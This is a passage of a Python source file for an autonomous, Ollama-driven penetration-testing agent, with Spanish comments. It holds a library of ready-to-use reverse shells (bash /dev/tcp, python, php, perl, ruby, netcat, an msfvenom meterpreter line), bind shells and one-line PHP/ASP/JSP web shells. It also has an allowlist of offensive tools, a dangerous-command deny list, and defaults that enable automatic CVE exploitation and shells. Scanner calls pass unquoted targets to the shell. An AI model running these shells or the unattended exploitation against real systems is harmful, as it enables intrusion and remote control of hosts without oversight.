#!/usr/bin/env python3
"""
PENTEST-CORE v4.0 - Agente de Penetration Testing Autonomo
Pentester automatico con IA + Ollama
"""

import json
import re
import subprocess
import os
import requests
import sys
import time
import threading
import select
import importlib
import sqlite3
import argparse
import shutil
import hashlib
from pathlib import Path
from datetime import datetime, timedelta
from typing import Optional, Callable, Any
from dataclasses import dataclass, field, asdict
from enum import Enum
from concurrent.futures import ThreadPoolExecutor, as_completed
from collections import defaultdict
from queue import Queue
from urllib.parse import urlparse

BASE_DIR = Path(__file__).parent.resolve()
CHECKPOINT_DIR = BASE_DIR / "checkpoints"
LOGS_DIR = BASE_DIR / "logs"
PROMPTS_FILE = BASE_DIR / "prompts.json"
DB_FILE = BASE_DIR / "vibe_hacker.db"
PLUGINS_DIR = BASE_DIR / "plugins"
REPORTS_DIR = BASE_DIR / "reports"
CONFIG_FILE = Path.home() / ".vibehackerrc"
METRICS_FILE = BASE_DIR / "metrics.jsonl"
TODO_FILE = BASE_DIR / "todo.txt"

OLLAMA_URL = "http://localhost:11434/api/chat"
MODEL = "qwen2.5-coder:7b"
VIBE_STATUS_FILE = "/tmp/vibe_status"

TIMEOUT_DEFAULT = 300
TIMEOUT_NMAP = 600
TIMEOUT_ENUM = 120
TIMEOUT_NUCLEI = 900
TIMEOUT_SQLMAP = 900
TIMEOUT_MSF = 1200

COMMAND_ALLOWLIST = {
    "nmap",
    "gobuster",
    "dirb",
    "ffuf",
    "nikto",
    "sqlmap",
    "hydra",
    "curl",
    "wget",
    "nc",
    "netcat",
    "ssh",
    "ftp",
    "smbclient",
    "enum4linux",
    "smbmap",
    "searchsploit",
    "msfconsole",
    "msfvenom",
    "john",
    "hashcat",
    "steghide",
    "binwalk",
    "exiftool",
    "foremost",
    "zip2john",
    "unzip",
    "tar",
    "grep",
    "cat",
    "head",
    "tail",
    "less",
    "ls",
    "cd",
    "pwd",
    "find",
    "chmod",
    "python3",
    "python",
    "php",
    "ruby",
    "perl",
    "bash",
    "sh",
    "echo",
    "ps",
    "kill",
    "pkill",
    "systemctl",
    "service",
    "netstat",
    "ss",
    "ifconfig",
    "ip",
    "id",
    "whoami",
    "hostname",
    "uname",
    "arch",
    "sudo",
    "su",
    "mkdir",
    "rm",
    "cp",
    "mv",
    "touch",
    "file",
    "strings",
    "hexdump",
    "xxd",
    "base64",
    "ncat",
    "socat",
    "tcpdump",
    "wireshark",
    "tshark",
    "ping",
    "traceroute",
    "nslookup",
    "dig",
    "host",
    "whatweb",
    "wappalyzer",
    "nuclei",
    "dirbuster",
    "xsstrike",
    "dalfox",
    "sqlmap",
    "ldapsearch",
    "snmpwalk",
    "rdpsec",
    "xfreerdp",
    "rdesktop",
    "linpeas",
    "linenum",
    "pspy",
    "pspy64",
    "linux-smart-enumeration",
    "lse",
    "peass",
    "peass-ng",
    "unix-privesc-check",
    "commix",
    "wpscan",
    "joomscan",
    "droopescan",
    "gitdump",
    "gitdumper",
    "svn",
    "svndumper",
    "渗透",
    "weevely",
    "meterpreter",
    "msfpc",
    "empire",
    "covenant",
    "nmap-script",
    "nse",
}

DANGEROUS_PATTERNS = [
    r"rm\s+-rf\s+/",
    r":\(\)\{",
    r"forkbomb",
    r"curl.*\|.*sh",
    r"wget.*\|.*sh",
    r">.*/etc/passwd",
    r"mv\s+.*/etc/shadow",
]

COMMAND_BLACKLIST = ["shutdown", "reboot", "init", "mkfs", ":(){"]

FLAG_PATTERNS = [
    r"flag\{[^}]+\}",
    r"ctf\{[^}]+\}",
    r"[a-f0-9]{32}",
    r"[A-F0-9]{32}",
    r"password[s]?\s*[=:]\s*\S+",
    r"api[_-]?key\s*[=:]\s*\S+",
    r"secret[s]?\s*[=:]\s*\S+",
    r"token\s*[=:]\s*[A-Za-z0-9_-]+",
]

CVE_PATTERN = r"CVE-\d{4}-\d{4,}"

CHECKPOINT_DIR.mkdir(exist_ok=True)
LOGS_DIR.mkdir(exist_ok=True)
PLUGINS_DIR.mkdir(exist_ok=True)
REPORTS_DIR.mkdir(exist_ok=True)


class Colors:
    HEADER = "\033[95m"
    BLUE = "\033[94m"
    CYAN = "\033[96m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    RED = "\033[91m"
    MAGENTA = "\033[35m"
    BOLD = "\033[1m"
    DIM = "\033[2m"
    RESET = "\033[0m"
    _enabled: bool = True

    @classmethod
    def disable(cls):
        cls._enabled = False
        for attr in dir(cls):
            if attr.startswith("_") or attr in ("disable", "enable"):
                continue
            setattr(cls, attr, "")

    @classmethod
    def enable(cls):
        cls._enabled = True
        cls.HEADER = "\033[95m"
        cls.BLUE = "\033[94m"
        cls.CYAN = "\033[96m"
        cls.GREEN = "\033[92m"
        cls.YELLOW = "\033[93m"
        cls.RED = "\033[91m"
        cls.MAGENTA = "\033[35m"
        cls.BOLD = "\033[1m"
        cls.DIM = "\033[2m"
        cls.RESET = "\033[0m"


def cprint(text: str, color: str = "", bold: bool = False, end: str = "\n") -> None:
    if not Colors._enabled:
        print(text, end=end)
        return
    prefix = color + (Colors.BOLD if bold else "")
    print(f"{prefix}{text}{Colors.RESET}", end=end)


class Config:
    _instance = None
    _config = {}

    def __new__(cls):
        if cls._instance is None:
            cls._instance = super().__new__(cls)
            cls._instance._load_config()
        return cls._instance

    def _load_config(self):
        if CONFIG_FILE.exists():
            try:
                with open(CONFIG_FILE, "r") as f:
                    self._config = json.load(f)
            except Exception:
                self._config = self._default_config()
        else:
            self._config = self._default_config()

    def _default_config(self) -> dict:
        return {
            "ollama_url": "http://localhost:11434/api/chat",
            "model": "qwen2.5-coder:7b",
            "auto_exploit_cve": True,
            "auto_shell": True,
            "aggressive_mode": True,
            "parallel_jobs": 3,
        }

    def get(self, key: str, default: Any = None) -> Any:
        return self._config.get(key, default)

    def set(self, key: str, value: Any) -> None:
        self._config[key] = value
        self.save()

    def save(self) -> None:
        try:
            with open(CONFIG_FILE, "w") as f:
                json.dump(self._config, f, indent=2)
        except Exception:
            pass


config = Config()


class Database:
    def __init__(self, db_path: Path = DB_FILE):
        self.db_path = db_path
        self.conn = sqlite3.connect(str(db_path), check_same_thread=False)
        self.conn.row_factory = sqlite3.Row
        self._init_db()

    def _init_db(self):
        self.conn.executescript("""
            CREATE TABLE IF NOT EXISTS sessions (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                target_ip TEXT NOT NULL,
                started_at TEXT NOT NULL,
                finished_at TEXT,
                status TEXT DEFAULT 'running',
                commands INTEGER DEFAULT 0,
                findings TEXT DEFAULT '',
                flags TEXT DEFAULT '',
                cves TEXT DEFAULT '[]',
                duration INTEGER DEFAULT 0,
                phase_timings TEXT DEFAULT '{}'
            );
            
            CREATE TABLE IF NOT EXISTS commands (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                session_id INTEGER NOT NULL,
                timestamp TEXT NOT NULL,
                command TEXT NOT NULL,
                output TEXT DEFAULT '',
                vibe TEXT DEFAULT '',
                duration INTEGER DEFAULT 0,
                exit_code INTEGER DEFAULT 0,
                FOREIGN KEY (session_id) REFERENCES sessions(id)
            );
            
            CREATE TABLE IF NOT EXISTS cves (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                session_id INTEGER NOT NULL,
                cve_id TEXT NOT NULL,
                service TEXT DEFAULT '',
                severity TEXT DEFAULT '',
                description TEXT DEFAULT '',
                exploited INTEGER DEFAULT 0,
                FOREIGN KEY (session_id) REFERENCES sessions(id)
            );
            
            CREATE TABLE IF NOT EXISTS metrics (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TEXT NOT NULL,
                event_type TEXT NOT NULL,
                session_id INTEGER,
                data TEXT DEFAULT '{}'
            );
            
            CREATE INDEX IF NOT EXISTS idx_session_ip ON sessions(target_ip);
            CREATE INDEX IF NOT EXISTS idx_command_session ON commands(session_id);
            CREATE INDEX IF NOT EXISTS idx_cves_session ON cves(session_id);
            CREATE INDEX IF NOT EXISTS idx_metrics_session ON metrics(session_id);
            
            CREATE TABLE IF NOT EXISTS lessons (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                command_pattern TEXT NOT NULL,
                success INTEGER NOT NULL,
                note TEXT DEFAULT '',
                count INTEGER DEFAULT 1,
                last_used TEXT NOT NULL
            );
            
            CREATE INDEX IF NOT EXISTS idx_lessons_pattern ON lessons(command_pattern);
        """)
        self.conn.commit()

    def create_session(self, target_ip: str) -> Optional[int]:
        cursor = self.conn.cursor()
        cursor.execute(
            "INSERT INTO sessions (target_ip, started_at) VALUES (?, ?)",
            (target_ip, datetime.now().isoformat()),
        )
        self.conn.commit()
        return cursor.lastrowid

    def update_session(self, session_id: int, **kwargs):
        fields = ", ".join(f"{k} = ?" for k in kwargs.keys())
        values = list(kwargs.values()) + [session_id]
        self.conn.execute(f"UPDATE sessions SET {fields} WHERE id = ?", values)
        self.conn.commit()

    def log_command(
        self,
        session_id: int,
        command: str,
        output: str,
        vibe: str,
        duration: int = 0,
        exit_code: int = 0,
    ):
        self.conn.execute(
            "INSERT INTO commands (session_id, timestamp, command, output, vibe, duration, exit_code) VALUES (?, ?, ?, ?, ?, ?, ?)",
            (
                session_id,
                datetime.now().isoformat(),
                command,
                output,
                vibe,
                duration,
                exit_code,
            ),
        )
        self.conn.execute(
            "UPDATE sessions SET commands = commands + 1 WHERE id = ?", (session_id,)
        )
        self.conn.commit()

    def log_cve(
        self,
        session_id: int,
        cve_id: str,
        service: str = "",
        severity: str = "",
        description: str = "",
    ):
        self.conn.execute(
            "INSERT INTO cves (session_id, cve_id, service, severity, description) VALUES (?, ?, ?, ?, ?)",
            (session_id, cve_id, service, severity, description),
        )
        cves = self.conn.execute(
            "SELECT cves FROM sessions WHERE id = ?", (session_id,)
        ).fetchone()
        if cves and cves[0]:
            current_cves = json.loads(cves[0])
        else:
            current_cves = []
        current_cves.append(cve_id)
        self.conn.execute(
            "UPDATE sessions SET cves = ? WHERE id = ?",
            (json.dumps(current_cves), session_id),
        )
        self.conn.commit()

    def mark_cve_exploited(self, cve_id: str, session_id: int):
        self.conn.execute(
            "UPDATE cves SET exploited = 1 WHERE session_id = ? AND cve_id = ?",
            (session_id, cve_id),
        )
        self.conn.commit()

    def get_cves(self, session_id: int) -> list:
        cursor = self.conn.execute(
            "SELECT * FROM cves WHERE session_id = ?", (session_id,)
        )
        return [dict(row) for row in cursor.fetchall()]

    def log_metric(self, event_type: str, session_id: Optional[int] = None, **data):
        self.conn.execute(
            "INSERT INTO metrics (timestamp, event_type, session_id, data) VALUES (?, ?, ?, ?)",
            (datetime.now().isoformat(), event_type, session_id, json.dumps(data)),
        )
        self.conn.commit()

    def get_session(self, session_id: int) -> Optional[dict]:
        cursor = self.conn.execute("SELECT * FROM sessions WHERE id = ?", (session_id,))
        row = cursor.fetchone()
        return dict(row) if row else None

    def get_session_by_ip(self, target_ip: str) -> Optional[dict]:
        cursor = self.conn.execute(
            "SELECT * FROM sessions WHERE target_ip = ? AND status = 'running' ORDER BY id DESC LIMIT 1",
            (target_ip,),
        )
        row = cursor.fetchone()
        return dict(row) if row else None

    def list_sessions(self, status: Optional[str] = None) -> list:
        query = "SELECT * FROM sessions"
        params = []
        if status:
            query += " WHERE status = ?"
            params.append(status)
        query += " ORDER BY id DESC"
        cursor = self.conn.execute(query, params)
        return [dict(row) for row in cursor.fetchall()]

    def get_commands(self, session_id: int) -> list:
        cursor = self.conn.execute(
            "SELECT * FROM commands WHERE session_id = ? ORDER BY id", (session_id,)
        )
        return [dict(row) for row in cursor.fetchall()]

    def get_metrics(self, session_id: Optional[int] = None) -> list:
        query = "SELECT * FROM metrics"
        params = []
        if session_id:
            query += " WHERE session_id = ?"
            params.append(session_id)
        query += " ORDER BY timestamp"
        cursor = self.conn.execute(query, params)
        return [dict(row) for row in cursor.fetchall()]

    def get_all_ips(self) -> list:
        cursor = self.conn.execute(
            "SELECT DISTINCT target_ip FROM sessions ORDER BY started_at DESC"
        )
        return [row[0] for row in cursor.fetchall()]

    def close(self):
        self.conn.close()


class CVEAnalyzer:
    @staticmethod
    def extract_cves(text: str) -> list:
        return list(set(re.findall(CVE_PATTERN, text, re.IGNORECASE)))

    @staticmethod
    def search_exploits(cve_id: str) -> str:
        try:
            result = subprocess.run(
                ["searchsploit", cve_id], capture_output=True, text=True, timeout=30
            )
            return result.stdout if result.stdout else result.stderr
        except Exception as e:
            return f"Error buscando exploits: {e}"

    @staticmethod
    def search_service_exploits(service: str, version: str = "") -> str:
        query = f"{service} {version}".strip()
        if not query:
            return "Servicio no especificado"
        try:
            result = subprocess.run(
                ["searchsploit", query], capture_output=True, text=True, timeout=30
            )
            return result.stdout if result.stdout else result.stderr
        except Exception as e:
            return f"Error buscando exploits: {e}"

    @staticmethod
    def get_cve_details(cve_id: str) -> dict:
        try:
            url = f"https://services.nvd.nist.gov/rest/json/cves/2.0?cveId={cve_id}"
            resp = requests.get(url, timeout=10)
            if resp.status_code == 200:
                data = resp.json()
                if data.get("vulnerabilities"):
                    vuln = data["vulnerabilities"][0]["cve"]
                    return {
                        "id": cve_id,
                        "description": vuln.get("descriptions", [{}])[0].get(
                            "value", ""
                        ),
                        "severity": "Unknown",
                        "cvss": "N/A",
                    }
        except Exception:
            pass
        return {"id": cve_id, "description": "", "severity": "Unknown", "cvss": "N/A"}


class ShellGenerator:
    @staticmethod
    def generate_reverse_shells(target_ip: str, port: int = 4444) -> dict:
        shells = {
            "bash": f"bash -i >& /dev/tcp/{target_ip}/{port} 0>&1",
            "bash_2": f"0<&196;exec 196<>/dev/tcp/{target_ip}/{port};sh <&196 >&196 2>&196",
            "python": f'python3 -c \'import socket,subprocess,os;s=socket.socket();s.connect(("{target_ip}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'',
            "php": f'php -r \'$sock=fsockopen("{target_ip}",{port});exec("/bin/sh -i <&3 >&3 2>&3");\'',
            "perl": f'perl -e \'use Socket;$i="{target_ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};\'',
            "ruby": f'ruby -rsocket -e \'f=TCPSocket.open("{target_ip}",{port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f);\'',
            "nc": f"nc -e /bin/sh {target_ip} {port}",
            "nc_mknod": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {target_ip} {port} >/tmp/f",
            "msf": f"msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={target_ip} LPORT={port} -f elf > shell.elf",
        }
        return shells

    @staticmethod
    def generate_bind_shells(port: int = 4444) -> dict:
        shells = {
            "nc": f"nc -lvp {port} -e /bin/bash",
            "python": f"python3 -c 'import socket,os,pty,sys;s=socket.socket();s.bind(('',{port}));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);pty.spawn(\"/bin/bash\")'",
        }
        return shells

    @staticmethod
    def web_shells() -> dict:
        return {
            "php": "<?php system($_REQUEST['cmd']); ?>",
            "asp": "<% eval request('cmd') %>",
            "jsp": "<% Runtime.getRuntime().exec(request.getParameter('cmd')); %>",
        }


class AdaptiveMemory:
    """
    Sistema de memoria adaptativa que aprende de errores y successes.
    """

    def __init__(self, db: "Database"):
        self.db = db
        self.session_failures = []
        self.session_successes = []
        self.failed_commands = set()
        self.successful_patterns = defaultdict(int)
        self.failed_patterns = defaultdict(int)

    def log_failure(self, command: str, reason: str, output: str = ""):
        """Registra un comando que fallo."""
        self.session_failures.append(
            {
                "command": command,
                "reason": reason,
                "output_preview": output[:200] if output else "",
                "timestamp": datetime.now().isoformat(),
            }
        )
        self.failed_commands.add(command)

        pattern = self._extract_pattern(command)
        self.failed_patterns[pattern] += 1

        self._save_lesson(command, reason, success=False)

    def log_success(self, command: str, finding: str = ""):
        """Registra un comando que funciono."""
        self.session_successes.append(
            {
                "command": command,
                "finding": finding,
                "timestamp": datetime.now().isoformat(),
            }
        )

        pattern = self._extract_pattern(command)
        self.successful_patterns[pattern] += 1

        self._save_lesson(command, finding, success=True)

    def _extract_pattern(self, command: str) -> str:
        """Extrae el patron base de un comando (去掉 IPs, ports, etc)."""
        import re

        pattern = command.lower()
        pattern = re.sub(r"\d+\.\d+\.\d+\.\d+", "TARGET", pattern)
        pattern = re.sub(r"\d{1,5}", "PORT", pattern)
        pattern = re.sub(r"http[s]?://[^\s]+", "URL", pattern)
        pattern = re.sub(r"/[a-z0-9_.-]+", "/PATH", pattern)
        pattern = re.sub(r" -[a-z0-9]+ ", " FLAGS ", pattern)
        words = pattern.split()
        return " ".join(words[:4])

    def _save_lesson(self, command: str, note: str, success: bool):
        """Guarda la leccion en la base de datos."""
        try:
            self.db.conn.execute(
                """
                INSERT OR REPLACE INTO lessons (command_pattern, success, note, count, last_used)
                VALUES (?, ?, ?, 
                    COALESCE((SELECT count FROM lessons WHERE command_pattern = ?), 0) + 1,
                    ?)
            """,
                (
                    self._extract_pattern(command),
                    1 if success else 0,
                    note[:500],
                    self._extract_pattern(command),
                    datetime.now().isoformat(),
                ),
            )
            self.db.conn.commit()
        except Exception:
            pass

    def get_context_for_prompt(self) -> str:
        """Genera contexto adaptativo para el prompt."""
        context_parts = []

        failed_patterns = []
        for pattern, count in self.failed_patterns.items():
            if count >= 1:
                failed_patterns.append((pattern, count))

        if failed_patterns:
            context_parts.append("NO FUNCIONO ANTES (no repetir):")
            for pattern, count in failed_patterns[:5]:
                context_parts.append(f"  - {pattern} (fallo {count} vez)")

        successful_patterns = []
        for pattern, count in self.successful_patterns.items():
            if count >= 1:
                successful_patterns.append((pattern, count))

        if successful_patterns:
            context_parts.append("\nSI FUNCIONO ANTES:")
            for pattern, count in successful_patterns[:5]:
                context_parts.append(f"  - {pattern} (funciono {count} vez)")

        try:
            recent_lessons = self.db.conn.execute("""
                SELECT command_pattern, success, note FROM lessons 
                ORDER BY last_used DESC LIMIT 10
            """).fetchall()

            if recent_lessons:
                context_parts.append("\nLECCIONES APRENDIDAS:")
                for lesson in recent_lessons:
                    status = "OK" if lesson[1] else "FAIL"
                    context_parts.append(f"  [{status}] {lesson[0]}: {lesson[2][:50]}")
        except Exception:
            pass

        if not context_parts:
            return ""

        return "\n".join(context_parts)

    def get_postmortem(self) -> str:
        """Genera post-mortem al final de la sesion."""
        if not self.session_failures and not self.session_successes:
            return "Sin comandos ejecutados."

        lines = ["=" * 50, "POST-MORTEM DE LA SESION", "=" * 50, ""]

        if self.session_successes:
            lines.append(f"SUCCESS ({len(self.session_successes)} comandos):")
            for s in self.session_successes[:10]:
                finding = s.get("finding", "")[:100]
                lines.append(f"  [OK] {s['command'][:60]} -> {finding}")

        if self.session_failures:
            lines.append(f"\nFAILURES ({len(self.session_failures)} comandos):")
            for f in self.session_failures[:10]:
                reason = f.get("reason", "")[:100]
                lines.append(f"  [FAIL] {f['command'][:60]}")
                lines.append(f"    Reason: {reason}")

        lines.append("\n" + "=" * 50)

        if self.successful_patterns:
            top_success = sorted(self.successful_patterns.items(), key=lambda x: -x[1])[
                :3
            ]
            lines.append("TOP PATRONES EXITOSOS:")
            for pattern, count in top_success:
                lines.append(f"  {pattern}: {count} veces")

        if self.failed_patterns:
            top_fail = sorted(self.failed_patterns.items(), key=lambda x: -x[1])[:3]
            lines.append("\nPATRONES FALLIDOS:")
            for pattern, count in top_fail:
                lines.append(f"  {pattern}: {count} veces")

        lines.append("=" * 50)

        return "\n".join(lines)

    def should_skip_command(self, command: str) -> bool:
        """Check si un comando debe ser saltado basado en historial."""
        return command in self.failed_commands


class NucleiScanner:
    @staticmethod
    def scan(target: str, severity: str = "critical,high,medium") -> str:
        cmd = f"nuclei -u {target} -severity {severity} -silent -json -retries 2"
        try:
            result = subprocess.run(
                cmd, shell=True, capture_output=True, text=True, timeout=900
            )
            return result.stdout if result.stdout else result.stderr
        except subprocess.TimeoutExpired:
            return "Nuclei scan timeout"
        except Exception as e:
            return f"Nuclei error: {e}"

    @staticmethod
    def scan_with_templates(target: str, templates: str) -> str:
        cmd = f"nuclei -u {target} -t {templates} -silent"
        try:
            result = subprocess.run(
                cmd, shell=True, capture_output=True, text=True, timeout=900
            )
            return result.stdout if result.stdout else result.stderr
        except Exception as e:
            return f"Nuclei error: {e}"


class WordlistManager:
    def __init__(self):
        self.common_wordlists = {
            "web_common": "/usr/share/wordlists/dirb/common.txt",
            "web_big": "/usr/share/wordlists/dirb/big.txt",
            "dns": "/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt",
            "passwords": "/usr/share/wordlists/rockyou.txt",
            "usernames": "/usr/share/seclists/Usernames/top-usernames-shortlist.txt",
        }

    def get_available(self) -> dict:
        available = {}
        for name, path in self.common_wordlists.items():
            if Path(path).exists():
                available[name] = path
        return available

    def suggest_wordlist(self, target_type: str) -> Optional[str]:
        if target_type == "web":
            return self.common_wordlists.get("web_common")
        elif target_type == "dns":
            return self.common_wordlists.get("dns")
        elif target_type == "password":
            return self.common_wordlists.get("passwords")
        return None


class MetricsCollector:
    def __init__(self, db: Database, session_id: Optional[int] = None):
        self.db = db
        self.session_id = session_id
        self._start_time = time.time()
        self._phase_times = defaultdict(float)
        self._current_phase = "init"
        self._command_count = 0
        self._flag_count = 0
        self._cve_count = 0
        self._error_count = 0

    def set_phase(self, phase: str) -> None:
        now = time.time()
        if self._current_phase:
            self._phase_times[self._current_phase] += now - self._start_time
        self._current_phase = phase
        self._start_time = now

    def log_command(self, success: bool = True) -> None:
        self._command_count += 1
        if not success:
            self._error_count += 1
        self.db.log_metric(
            "command_executed",
            self.session_id,
            success=success,
            phase=self._current_phase,
        )

    def log_flag(self) -> None:
        self._flag_count += 1
        self.db.log_metric("flag_found", self.session_id)

    def log_cve(self) -> None:
        self._cve_count += 1

    def get_summary(self) -> dict:
        total_time = sum(self._phase_times.values())
        return {
            "total_time": total_time,
            "phase_times": dict(self._phase_times),
            "commands": self._command_count,
            "errors": self._error_count,
            "flags": self._flag_count,
            "cves": self._cve_count,
            "commands_per_minute": (self._command_count / total_time * 60)
            if total_time > 0
            else 0,
        }

    def save_to_db(self) -> None:
        summary = self.get_summary()
        if self.session_id:
            self.db.update_session(
                self.session_id,
                duration=int(summary["total_time"]),
                phase_timings=json.dumps(summary["phase_times"]),
            )


class Telemetry:
    @staticmethod
    def log_jsonl(event: dict) -> None:
        try:
            with open(METRICS_FILE, "a") as f:
                f.write(json.dumps(event) + "\n")
        except Exception:
            pass

    @staticmethod
    def log_command(
        target: str,
        command: str,
        duration: float,
        success: bool,
        cve_found: bool = False,
    ):
        Telemetry.log_jsonl(
            {
                "timestamp": datetime.now().isoformat(),
                "type": "command",
                "target": target,
                "command": command[:100],
                "duration": duration,
                "success": success,
                "cve_found": cve_found,
            }
        )

    @staticmethod
    def log_audit_start(target: str, session_id: int):
        Telemetry.log_jsonl(
            {
                "timestamp": datetime.now().isoformat(),
                "type": "audit_start",
                "target": target,
                "session_id": session_id,
            }
        )

    @staticmethod
    def log_audit_end(
        target: str,
        session_id: int,
        flags: int,
        cves: int,
        duration: float,
        status: str,
    ):
        Telemetry.log_jsonl(
            {
                "timestamp": datetime.now().isoformat(),
                "type": "audit_end",
                "target": target,
                "session_id": session_id,
                "flags": flags,
                "cves": cves,
                "duration": duration,
                "status": status,
            }
        )


class ReportGenerator:
    def __init__(self, session: dict, commands: list[dict], cves: list[dict] = None):
        self.session = session
        self.commands = commands
        self.cves = cves or []

    def to_markdown(self) -> str:
        md = f"""# Reporte de Pentesting - PENTEST-CORE v4.0

## Informacion General

| Campo | Valor |
|-------|-------|
| **IP Objetivo** | `{self.session["target_ip"]}` |
| **Fecha Inicio** | {self.session["started_at"]} |
| **Fecha Fin** | {self.session.get("finished_at", "En progreso")} |
| **Estado** | {self.session["status"]} |
| **Comandos Ejecutados** | {self.session["commands"]} |
| **CVEs Detectados** | {len(self.cves)} |
| **Duracion** | {self.session.get("duration", 0)}s |

## Flags Encontradas

```
{self.session.get("flags", "Ninguna")}
```

## CVEs Detectados

"""
        for cve in self.cves:
            md += f"- **{cve['cve_id']}** ({cve['severity']}) - {cve['service']}\n"
            if cve["description"]:
                md += f"  - {cve['description'][:200]}...\n"
            if cve["exploited"]:
                md += f"  - [EXPLOTADO]\n"

        md += """
## Hallazgos

```
"""
        md += self.session.get("findings", "Sin hallazgos registrados")
        md += """
```

## Historial de Comandos

"""
        for cmd in self.commands:
            md += f"""### [{cmd["timestamp"]}] {cmd["vibe"]}

**Comando:**
```bash
{cmd["command"]}
```

**Salida:**
```
{cmd["output"][:1000]}{"..." if len(cmd["output"]) > 1000 else ""}
```

---

"""
        return md

    def to_html(self) -> str:
        flags = self.session.get("flags", "Ninguna")
        findings = self.session.get("findings", "Sin hallazgos")
        phase_timings = json.loads(self.session.get("phase_timings", "{}"))

        cves_html = ""
        for cve in self.cves:
            exploited = "EXPLOTADO" if cve["exploited"] else "No explotado"
            exploited_color = "#4ec9b0" if cve["exploited"] else "#dcdcaa"
            cves_html += f"<li style='color:{exploited_color}'>{cve['cve_id']} ({cve['severity']}) - {cve['service']} [{exploited}]</li>"

        commands_html = ""
        for cmd in self.commands:
            commands_html += f"""
            <div class="command">
                <h4>[{cmd["timestamp"]}] {cmd["vibe"]} ({cmd.get("duration", 0)}s)</h4>
                <pre class="command-cmd">{cmd["command"]}</pre>
                <details>
                    <summary>Ver salida ({len(cmd["output"])} chars)</summary>
                    <pre class="command-out">{self._escape_html(cmd["output"][:2000])}</pre>
                </details>
            </div>
            """

        phases_html = "".join(
            f"<li>{phase}: {duration:.1f}s</li>"
            for phase, duration in phase_timings.items()
        )

        return f"""<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Pentest Report - {self.session["target_ip"]}</title>
    <style>
        body {{ font-family: 'Courier New', monospace; margin: 40px; background: #1e1e1e; color: #d4d4d4; }}
        h1 {{ color: #4ec9b0; border-bottom: 2px solid #4ec9b0; padding-bottom: 10px; }}
        h2 {{ color: #569cd6; margin-top: 30px; }}
        table {{ border-collapse: collapse; width: 100%; margin: 20px 0; }}
        th, td {{ border: 1px solid #3e3e3e; padding: 10px; text-align: left; }}
        th {{ background: #2d2d2d; color: #4ec9b0; }}
        .command {{ background: #252526; padding: 15px; margin: 15px 0; border-radius: 5px; }}
        .command-cmd {{ background: #1e1e1e; padding: 10px; border-left: 3px solid #569cd6; }}
        .command-out {{ background: #1a1a1a; padding: 10px; max-height: 300px; overflow: auto; }}
        pre {{ white-space: pre-wrap; word-wrap: break-word; }}
        .flags {{ background: #0e0e0e; padding: 15px; border: 2px solid #4ec9b0; margin: 15px 0; }}
        .cves {{ background: #0e0e0e; padding: 15px; border: 2px solid #dcdcaa; margin: 15px 0; }}
        .stats {{ display: flex; gap: 20px; }}
        .stat {{ background: #252526; padding: 15px; border-radius: 5px; flex: 1; text-align: center; }}
        .stat-value {{ font-size: 2em; color: #4ec9b0; }}
        .stat-label {{ color: #808080; }}
    </style>
</head>
<body>
    <h1>Reporte de Pentesting</h1>
    
    <div class="stats">
        <div class="stat"><div class="stat-value">{self.session["commands"]}</div><div class="stat-label">Comandos</div></div>
        <div class="stat"><div class="stat-value">{self.session.get("duration", 0)}s</div><div class="stat-label">Duracion</div></div>
        <div class="stat"><div class="stat-value">{len(self.cves)}</div><div class="stat-label">CVEs</div></div>
        <div class="stat"><div class="stat-value">{len([f for f in (self.session.get("flags", "") or "").split() if "flag" in f.lower()])}</div><div class="stat-label">Flags</div></div>
    </div>
    
    <h2>Informacion General</h2>
    <table>
        <tr><th>IP Objetivo</th><td><code>{self.session["target_ip"]}</code></td></tr>
        <tr><th>Inicio</th><td>{self.session["started_at"]}</td></tr>
        <tr><th>Fin</th><td>{self.session.get("finished_at", "En progreso")}</td></tr>
        <tr><th>Estado</th><td>{self.session["status"]}</td></tr>
    </table>
    
    <h2>Tiempo por Fase</h2>
    <ul>{phases_html}</ul>
    
    <h2>CVEs Detectados</h2>
    <div class="cves"><ul>{cves_html or "<li>Sin CVEs detectados</li>"}</ul></div>
    
    <h2>Flags</h2>
    <div class="flags"><pre>{self._escape_html(flags)}</pre></div>
    
    <h2>Hallazgos</h2>
    <pre>{self._escape_html(findings)}</pre>
    
    <h2>Historial de Comandos</h2>
    {commands_html}
    
    <footer style="margin-top: 40px; text-align: center; color: #6a6a6a;">
        Generado por PENTEST-CORE v4.0
    </footer>
</body>
</html>"""

    def to_json(self) -> str:
        return json.dumps(
            {
                "session": self.session,
                "commands": self.commands,
                "cves": self.cves,
            },
            indent=2,
            default=str,
        )

    def to_csv(self) -> str:
        output = "timestamp,vibe,command,duration,exit_code\n"
        for cmd in self.commands:
            output += f'"{cmd["timestamp"]}","{cmd["vibe"]}","{cmd["command"]}",{cmd.get("duration", 0)},{cmd.get("exit_code", 0)}\n'
        return output

    def _escape_html(self, text: str) -> str:
        return (
            text.replace("&", "&amp;")
            .replace("<", "&lt;")
            .replace(">", "&gt;")
            .replace('"', "&quot;")
        )

    def save(self, format: str = "both") -> list[Path]:
        paths = []
        target = self.session["target_ip"].replace(".", "_")
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")

        if format in ["md", "both"]:
            md_path = REPORTS_DIR / f"report_{target}_{timestamp}.md"
            md_path.write_text(self.to_markdown(), encoding="utf-8")
            paths.append(md_path)

        if format in ["html", "both"]:
            html_path = REPORTS_DIR / f"report_{target}_{timestamp}.html"
            html_path.write_text(self.to_html(), encoding="utf-8")
            paths.append(html_path)

        if format in ["json", "both"]:
            json_path = REPORTS_DIR / f"report_{target}_{timestamp}.json"
